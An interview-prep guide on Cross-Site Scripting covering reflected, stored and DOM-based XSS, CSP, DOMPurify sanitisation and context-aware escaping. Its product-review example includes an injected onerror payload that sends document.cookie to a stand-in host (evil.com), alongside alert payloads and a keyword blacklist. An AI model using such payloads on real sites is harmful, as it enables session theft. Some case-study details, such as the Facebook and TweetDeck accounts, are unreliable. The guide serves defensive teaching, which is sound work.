# 124. XSS (Cross-Site Scripting)

────────────────────────────────────
## 1. High-Level Explanation (Frontend Interview Level)
────────────────────────────────────

**What it is:**
XSS (Cross-Site Scripting) is a security vulnerability where attackers inject malicious JavaScript code into a web application that then executes in other users' browsers. It's one of the most common and dangerous web security threats.

**Why it exists:**
XSS vulnerabilities exist because web applications dynamically render user-generated content without proper sanitization or encoding. Browsers can't distinguish between legitimate application code and injected malicious scripts.

**When and where it's used (exploited):**
- Comment sections, user profiles, search results
- Rich text editors, markdown renderers
- URL parameters reflected in UI
- Error messages displaying user input
- Any place user input is rendered as HTML

**Role in large-scale applications:**
In enterprise applications, XSS can lead to:
- Session hijacking (stealing auth tokens)
- Credential theft via phishing overlays
- Defacement of critical UI
- Propagation of worms (self-replicating XSS)
- Data exfiltration to attacker servers

## 2. Deep-Dive Explanation (Senior / Staff Level)
────────────────────────────────────

### **Three Types of XSS:**

#### **1. Reflected XSS (Non-Persistent)**
- Malicious script comes from current HTTP request
- Example: `https://site.com/search?q=<script>alert('XSS')</script>`
- The script is reflected back in the response
- Most common type (~70% of XSS)

**Attack Flow:**
```
User clicks malicious link
  ↓
Server reflects input in HTML
  ↓
Browser executes injected script
  ↓
Script steals cookies/tokens and sends to attacker
```

#### **2. Stored XSS (Persistent)**
- Malicious script stored in database
- Executed every time data is retrieved and displayed
- More dangerous—affects all users viewing the content
- Common in comment systems, forums, user profiles

**Attack Flow:**
```
Attacker submits malicious comment
  ↓
Backend stores it without sanitization
  ↓
Other users load the page
  ↓
Script executes in every victim's browser
```

#### **3. DOM-based XSS**
- Entire attack happens client-side
- Server never sees the payload
- JavaScript manipulates DOM with untrusted data
- Example: `document.innerHTML = location.hash`

**Attack Flow:**
```
URL contains malicious payload in fragment
  ↓
Client-side JS reads from URL/DOM
  ↓
JS writes unsafely to DOM (innerHTML, eval, etc.)
  ↓
Browser executes injected code
```

### **Browser Behavior & Internals:**

**JavaScript Execution Contexts:**
- XSS scripts run in the same origin context as the application
- Full access to: cookies (if not HttpOnly), localStorage, sessionStorage, DOM
- Can make requests as the authenticated user
- Can read CSRF tokens from the page

**Content Security Policy (CSP) Interaction:**
- Modern defense mechanism
- Restricts which scripts can execute
- `script-src 'self'` blocks inline scripts
- `script-src 'nonce-xyz'` allows specific inline scripts
- Can prevent eval(), new Function()

### **Performance Implications:**

1. **Sanitization Overhead:**
   - DOMPurify: ~2-5ms for typical content
   - Heavy sanitization can block rendering
   - Should sanitize on backend + frontend

2. **CSP Performance:**
   - Minimal overhead (~1-2% slower page load)
   - Nonce generation adds server-side cost
   - Worth the security trade-off

3. **Framework Protections:**
   - React escapes by default (slight overhead)
   - Angular's DomSanitizer adds processing
   - Vue's v-html is dangerous but no overhead

### **Scalability Considerations:**

**Millions of Users:**
- One stored XSS can compromise all users
- CDN caching can spread malicious content
- Need automated scanning in CI/CD
- Rate limiting on user-generated content
- Real-time XSS detection systems

**Micro-frontends:**
- Each team must follow security standards
- Shared components need rigorous review
- iframe sandboxing for untrusted modules
- Runtime monitoring for unexpected scripts

### **Trade-offs:**

| Approach | Pros | Cons |
|----------|------|------|
| **Strict CSP** | Best protection | Breaks inline scripts, eval() |
| **Aggressive Sanitization** | Removes threats | May break legitimate HTML |
| **Framework Escaping** | Automatic, fast | Can be bypassed (dangerouslySetInnerHTML) |
| **Input Validation** | Prevents at source | Insufficient alone |

### **Common Pitfalls:**

❌ **Using innerHTML with user input:**
```javascript
// VULNERABLE
element.innerHTML = userInput;
```

❌ **Client-side sanitization only:**
```javascript
// INSUFFICIENT - attacker can bypass by calling API directly
const clean = sanitize(userInput);
await api.post('/comment', { text: clean });
```

❌ **Blacklist filtering:**
```javascript
// VULNERABLE - endless bypass possibilities
const blocked = ['<script>', 'javascript:', 'onerror'];
```

❌ **Double encoding attacks:**
```javascript
// Server decodes once, browser decodes again
// &lt;script&gt; → <script>
```

### **What NOT to Do:**

1. **Never trust client-side validation alone**
2. **Don't use eval() or Function() with user data**
3. **Don't disable framework protections (dangerouslySetInnerHTML without sanitization)**
4. **Don't reflect user input directly in error messages**
5. **Don't forget about CSS-based XSS:**
   ```css
   background: url('javascript:alert(1)');
   ```

## 3. Clear Real-World Examples
────────────────────────────────────

### **Example 1: Facebook's XSS Worm (2012)**
**Scenario:** Stored XSS in Facebook's messaging system
- Attacker injected script in a message
- Script posted itself to victim's friends
- Self-replicated across platform
- **Impact:** Affected thousands in minutes
- **Fix:** Aggressive CSP + sanitization on write and read

### **Example 2: Twitter's TweetDeck XSS (2014)**
**Scenario:** DOM-based XSS in tweet rendering
```javascript
// Vulnerable code (simplified)
tweetElement.innerHTML = tweet.content;
```
- Attacker crafted tweet with `<script>` tag
- Spread automatically when viewed in TweetDeck
- **Impact:** Forced Twitter to temporarily shut down TweetDeck
- **Fix:** Migrated to React (auto-escaping) + CSP

### **Example 3: E-commerce Product Reviews**
**Initial Design (Vulnerable):**
```javascript
// Backend stores raw HTML
await db.reviews.insert({ 
  productId, 
  content: req.body.review // <-- No sanitization!
});

// Frontend renders
<div dangerouslySetInnerHTML={{ __html: review.content }} />
```

**Attack:**
```javascript
// Attacker submits review:
"Great product! <img src=x onerror='
  fetch(\"https://evil.com?c=\" + document.cookie)
'>"
```

**Evolved Design (Secure):**
```javascript
// Backend - sanitize and store
import createDOMPurify from 'isomorphic-dompurify';
const clean = createDOMPurify.sanitize(req.body.review, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p'],
  ALLOWED_ATTR: []
});

// Frontend - defense in depth
import DOMPurify from 'dompurify';
const displayContent = DOMPurify.sanitize(review.content);

// Use React's safe rendering
<div>{displayContent}</div> // React escapes by default

// Or if HTML needed:
<div dangerouslySetInnerHTML={{ 
  __html: DOMPurify.sanitize(review.content) 
}} />
```

### **Example 4: Search Results Reflection**
**Vulnerable:**
```javascript
// URL: /search?q=<script>alert(1)</script>
app.get('/search', (req, res) => {
  res.send(`
    <h1>Results for: ${req.query.q}</h1>
  `);
});
```

**Secure:**
```javascript
import escapeHtml from 'escape-html';

app.get('/search', (req, res) => {
  res.send(`
    <h1>Results for: ${escapeHtml(req.query.q)}</h1>
  `);
});
```

## 4. Interview-Oriented Explanation
────────────────────────────────────

### **Sample Interview Answer (7+ years level):**

*"XSS is a vulnerability where attackers inject malicious scripts that execute in users' browsers. There are three types: Reflected XSS from request parameters, Stored XSS persisted in the database, and DOM-based XSS happening entirely client-side.*

*In production systems, I implement defense-in-depth:*

1. **Input Validation:** Reject obviously malicious input at the API gateway
2. **Backend Sanitization:** Use DOMPurify on the server before persisting
3. **Output Encoding:** Context-aware escaping when rendering (HTML, JS, CSS contexts differ)
4. **Framework Protections:** Leverage React's auto-escaping, avoid dangerouslySetInnerHTML
5. **CSP Headers:** Strict Content-Security-Policy with nonces for inline scripts
6. **HttpOnly Cookies:** Prevent script access to auth tokens

*The key is never trusting user input, and sanitizing at every boundary—client, server, and database. We also run automated security scans in CI/CD and conduct regular penetration testing."*

### **Likely Follow-up Questions:**

**Q1: "How do you handle rich text content that needs HTML?"**
*A: Use a whitelist-based sanitizer like DOMPurify with strict configuration. Only allow safe tags (p, b, i, a with href whitelisted). Sanitize on backend before storage and frontend before render as defense-in-depth. Consider markdown as safer alternative—parse to AST, then render safe HTML.*

**Q2: "What if an attacker bypasses your frontend sanitization?"**
*A: That's why we sanitize on the backend too. Frontend sanitization is UX (fast feedback), but backend is the security boundary. We also validate content types, length limits, and use parameterized database queries to prevent second-order XSS.*

**Q3: "How does CSP prevent XSS?"**
*A: CSP headers tell the browser which sources can execute scripts. With `script-src 'self'`, only scripts from our domain run—injected inline scripts are blocked. We use nonces for legitimate inline scripts. It's not foolproof but significantly raises the bar for attackers.*

**Q4: "Performance impact of sanitization on high-traffic sites?"**
*A: DOMPurify takes 2-5ms for typical content. We cache sanitized output in Redis with the content hash as key. For reads, we serve pre-sanitized HTML. We also sanitize asynchronously during content creation, not on every read. At scale, we offload to a dedicated sanitization service.*

**Q5: "How do you test for XSS vulnerabilities?"**
*A: We use automated scanners in CI (like OWASP ZAP), manual penetration testing quarterly, and bug bounty programs. We also have unit tests with XSS payloads from OWASP's XSS Cheat Sheet. Every user input field must have a corresponding XSS test.*

### **Comparisons with Alternative Approaches:**

| Approach | When to Use | Trade-off |
|----------|-------------|-----------|
| **Markdown Only** | Comments, posts | Safer but less formatting |
| **WYSIWYG + Sanitization** | Blogs, CMS | Rich editing but complex |
| **Plain Text + Auto-linking** | Chat, simple comments | Simple, fastest, most secure |
| **iframe Sandboxing** | Untrusted third-party content | Isolated but performance cost |

## 5. Code Examples
────────────────────────────────────

### **Example 1: Secure Comment System**

```javascript
// ============================================
// Backend API - Comment Submission
// ============================================
import createDOMPurify from 'isomorphic-dompurify';
import { body, validationResult } from 'express-validator';

app.post('/api/comments',
  // Input validation
  body('content')
    .trim()
    .isLength({ min: 1, max: 5000 })
    .escape(), // Basic escaping
  
  async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }

    // Strict sanitization
    const clean = createDOMPurify.sanitize(req.body.content, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br', 'a'],
      ALLOWED_ATTR: {
        'a': ['href', 'title']
      },
      ALLOWED_URI_REGEXP: /^https?:\/\//
    });

    // Store sanitized version
    const comment = await db.comments.create({
      userId: req.user.id,
      postId: req.body.postId,
      content: clean, // Already sanitized
      contentHash: crypto.createHash('sha256').update(clean).digest('hex')
    });

    res.json({ success: true, comment });
  }
);

// ============================================
// Frontend Component - Comment Display
// ============================================
import DOMPurify from 'dompurify';
import { useEffect, useState } from 'react';

function CommentList({ postId }) {
  const [comments, setComments] = useState([]);

  useEffect(() => {
    fetchComments();
  }, [postId]);

  const fetchComments = async () => {
    const response = await fetch(`/api/comments?postId=${postId}`);
    const data = await response.json();
    
    // Defense in depth: sanitize again on client
    const sanitized = data.map(comment => ({
      ...comment,
      // Even though backend sanitized, we don't trust any external data
      content: DOMPurify.sanitize(comment.content)
    }));
    
    setComments(sanitized);
  };

  return (
    <div>
      {comments.map(comment => (
        <Comment key={comment.id} data={comment} />
      ))}
    </div>
  );
}

function Comment({ data }) {
  // Safe: React escapes text content by default
  // return <div>{data.content}</div>; // This would escape HTML
  
  // If HTML is needed (already sanitized twice):
  return (
    <div 
      className="comment"
      dangerouslySetInnerHTML={{ __html: data.content }}
    />
  );
}
```

**Why this structure:**
- Backend sanitization prevents storage of malicious content
- Client-side sanitization protects against compromised API responses
- React's default escaping as last line of defense
- Hash can detect if content was tampered with in DB

### **Example 2: CSP Implementation**

```javascript
// ============================================
// Server - Express Middleware
// ============================================
import crypto from 'crypto';
import helmet from 'helmet';

app.use((req, res, next) => {
  // Generate nonce for this request
  res.locals.cspNonce = crypto.randomBytes(16).toString('base64');
  next();
});

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: [
        "'self'",
        // Allow scripts with nonce
        (req, res) => `'nonce-${res.locals.cspNonce}'`,
        // Allow specific CDNs
        "https://cdn.example.com"
      ],
      styleSrc: ["'self'", "'unsafe-inline'"], // Unfortunately needed for many CSS-in-JS
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "https://api.example.com"],
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
      objectSrc: ["'none'"],
      upgradeInsecureRequests: [],
    },
  })
);

// ============================================
// HTML Template with Nonce
// ============================================
app.get('/', (req, res) => {
  const nonce = res.locals.cspNonce;
  
  res.send(`
    <!DOCTYPE html>
    <html>
      <head>
        <!-- Inline script with nonce - ALLOWED -->
        <script nonce="${nonce}">
          window.APP_CONFIG = {
            apiUrl: '${process.env.API_URL}'
          };
        </script>
        
        <!-- External script from same origin - ALLOWED -->
        <script src="/bundle.js"></script>
        
        <!-- Inline script without nonce - BLOCKED by CSP -->
        <!-- <script>alert('XSS')</script> -->
      </head>
      <body>
        <div id="root"></div>
      </body>
    </html>
  `);
});

// ============================================
// React App - Using Nonce
// ============================================
// webpack.config.js
module.exports = {
  plugins: [
    new HtmlWebpackPlugin({
      templateContent: ({ htmlWebpackPlugin }) => `
        <!DOCTYPE html>
        <html>
          <head>
            ${htmlWebpackPlugin.tags.headTags}
          </head>
          <body>
            <div id="root"></div>
            ${htmlWebpackPlugin.tags.bodyTags}
          </body>
        </html>
      `,
    }),
  ],
};

// Server-side rendering would inject nonce into script tags
```

**Scalability impact:**
- Nonce generation: negligible CPU cost
- CSP parsing by browser: ~1-2% overhead
- Security benefit far outweighs performance cost

### **Example 3: Context-Aware Escaping**

```javascript
// ============================================
// Different Contexts Need Different Escaping
// ============================================

class XSSPrevention {
  // HTML Context
  static escapeHTML(str) {
    const map = {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#x27;',
      '/': '&#x2F;',
    };
    return str.replace(/[&<>"'/]/g, (char) => map[char]);
  }

  // JavaScript Context (inside <script> tag or event handler)
  static escapeJS(str) {
    return str
      .replace(/\\/g, '\\\\')
      .replace(/'/g, "\\'")
      .replace(/"/g, '\\"')
      .replace(/\n/g, '\\n')
      .replace(/\r/g, '\\r')
      .replace(/\t/g, '\\t')
      .replace(/<\/(script)/gi, '<\\/script');
  }

  // URL Context
  static escapeURL(str) {
    return encodeURIComponent(str);
  }

  // CSS Context
  static escapeCSS(str) {
    return str.replace(/[^a-zA-Z0-9]/g, (char) => {
      return '\\' + char.charCodeAt(0).toString(16) + ' ';
    });
  }
}

// ============================================
// Usage Examples
// ============================================

// WRONG: Same escaping everywhere
const userName = "<script>alert(1)</script>";

// ❌ VULNERABLE in JavaScript context
const html1 = `<script>var user = '${userName}';</script>`;

// ✅ CORRECT: Context-aware
const html2 = `
  <!-- HTML Context -->
  <div>${XSSPrevention.escapeHTML(userName)}</div>
  
  <!-- JavaScript Context -->
  <script>
    var user = '${XSSPrevention.escapeJS(userName)}';
  </script>
  
  <!-- URL Context -->
  <a href="/user/${XSSPrevention.escapeURL(userName)}">Profile</a>
  
  <!-- CSS Context -->
  <style>
    .user-${XSSPrevention.escapeCSS(userName)} {
      color: blue;
    }
  </style>
`;
```

## 6. Why & How Summary
────────────────────────────────────

### **Why It Matters:**

**UX Impact:**
- XSS can completely compromise user trust
- Phishing overlays can steal credentials
- Defaced UI damages brand reputation

**Performance Impact:**
- Sanitization adds 2-10ms per operation
- CSP has minimal overhead (<2%)
- Well worth the security benefit

**Business Impact:**
- Data breaches lead to regulatory fines (GDPR, CCPA)
- Loss of customer trust and revenue
- Legal liability for compromised user data
- Potential for widespread account takeover

### **How It Works:**

**Prevention Chain:**
```
User Input
  ↓
1. Client Validation (UX, NOT security)
  ↓
2. Server Validation (reject obvious attacks)
  ↓
3. Context-Aware Sanitization (DOMPurify)
  ↓
4. Safe Storage (sanitized content)
  ↓
5. Output Encoding (HTML entities)
  ↓
6. Framework Protection (React auto-escape)
  ↓
7. CSP Enforcement (browser blocks unexpected scripts)
  ↓
Browser Renders Safely
```

**Key Principles:**
1. **Never trust user input** - Always sanitize and validate
2. **Defense in depth** - Multiple layers of protection
3. **Context-aware escaping** - HTML ≠ JavaScript ≠ URL contexts
4. **Whitelist over blacklist** - Allow known-good, not block known-bad
5. **Leverage frameworks** - Use built-in protections (React, Angular escaping)
6. **Monitor and test** - Automated scanning + penetration testing

**Production Checklist:**
- [ ] All user input sanitized server-side
- [ ] Framework auto-escaping enabled
- [ ] Strict CSP with nonces
- [ ] HttpOnly, Secure cookies
- [ ] Automated XSS scanning in CI/CD
- [ ] Regular security audits
- [ ] Bug bounty program
- [ ] Incident response plan for XSS discoveries
